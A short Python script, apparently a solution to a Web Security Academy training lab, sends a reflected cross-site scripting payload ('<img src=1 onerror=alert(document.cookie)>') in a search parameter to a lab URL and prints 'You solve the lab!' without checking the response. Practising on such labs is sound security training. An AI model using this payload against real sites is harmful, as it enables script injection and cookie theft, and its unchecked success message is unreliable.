import requests

url = "https://0ac2001b045bbf8c8693a311006900d4.web-security-academy.net/"

payload = {
    "search" : "<img src=1 onerror=alert(document.cookie)>"
}

response = requests.get(url=url, params=payload)
print("You solve the lab!")